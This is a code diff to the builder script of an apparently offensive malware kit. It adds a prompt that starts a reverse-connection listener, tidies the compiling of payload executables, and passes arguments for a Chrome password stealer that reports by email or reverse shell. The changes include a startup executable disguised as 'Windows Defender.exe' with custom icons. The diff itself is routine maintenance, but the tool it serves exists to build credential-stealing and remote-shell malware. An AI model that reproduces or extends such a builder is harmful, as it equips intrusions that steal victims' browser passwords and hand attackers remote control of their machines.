@@ -6,7 +6,7 @@ import time
 
 from progress.spinner import Spinner
 from darkarp.malkit_modules import build
-# from testing import build
+#from testing import build
 
 # LOAD SETTINGS #
 
@@ -23,8 +23,17 @@ def build_listener(args):
     listener_script_final = listener_script.replace(
         "<<PORT>>", str(port))
 
-    with open("listener.py", "w") as f:
+    with open("listeners/listener.py", "w") as f:
         f.write(listener_script_final)
+    if args.no_interact == False:
+        invalid = True
+        while True:
+            start = input("Would you like to start the listener? [y/n]> ")
+            if start.lower() == "y" or start.lower() == 'yes':
+                exec(open("listeners/listener.py").read(), globals())
+                break
+            elif start.lower() == 'n' or start.lower() == "no":
+                break
     return len(listener_script_final)
 
 
@@ -68,13 +77,15 @@ def build_malware(args):
         f.write(mal_final)
 
     # Build the Executable and clean
-    build.exebuild(target=target, include='darkarp.malkit_modules.encrypt',
+
+    build.exebuild(target=target, include='_malkit',
                    output=startup_name, icon=startup_icon)
 
     include = build.generate_payload(filename=filename,
-                                     destname=payload_name, startup=startup_name, icon="icon.ico")
+                                     destname=payload_name, startup=startup_name, icon="icons/icon.ico")
 
-    build.exebuild(target=target, include=include, output=output)
+    build.exebuild(target=target, include=include,
+                   output=output, icon="icons/icon.ico")
     remove = [f'_malkit/{payload_name}.py',
               'Windows Defender.exe', 'malware.py', 'stub.py']
     for file in remove:
@@ -82,8 +93,15 @@ def build_malware(args):
             os.remove(file)
         except Exception as Err:
             print(Err)
-
-    return print(len(stub_final))
+    spinner = Spinner("Finalizing... ")
+    for i in range(10):
+        time.sleep(0.1)
+        spinner.next()
+    print("\n[+] Done")
+    time.sleep(1)
+    os.system("cls")
+    print("You can locate the generated file in the builds folder.")
+    return len(stub_final)
 
 
 def build_chromepass(args):
@@ -151,7 +169,7 @@ def build_chromepass(args):
         except Exception as e:
             print(e)
 
-        return print(len(cp_final))
+        return len(cp_final)
 
     elif args.reverse_shell and not args.email:
         host = args.host
@@ -177,6 +195,8 @@ def getOptions():
         'build_listener', epilog=listener_example, formatter_class=argparse.RawDescriptionHelpFormatter)
     parser_build_listener.add_argument(
         "-p", type=int, metavar=f"Port for reverse connection", required=True)
+    parser_build_listener.add_argument(
+        "--no_interact", default=False, action='store_true', required=False)
     parser_build_listener.set_defaults(func=build_listener)
 
     # Build malware
@@ -225,11 +245,14 @@ def getOptions():
     args = parser.parse_args()
 
     # Check for mutually inclusive
+    try:
 
-    if args.email and (args.address is None):
-        parser.error("--email requires --address and --password.")
-    elif args.reverse_shell and (args.host is None or args.port is None):
-        parser.error("--reverse_shell requires --host and --port.")
+        if args.email and (args.address is None):
+            parser.error("--email requires --address and --password.")
+        elif args.reverse_shell and (args.host is None or args.port is None):
+            parser.error("--reverse_shell requires --host and --port.")
+    except:
+        pass
 
     try:
         args.func(args)
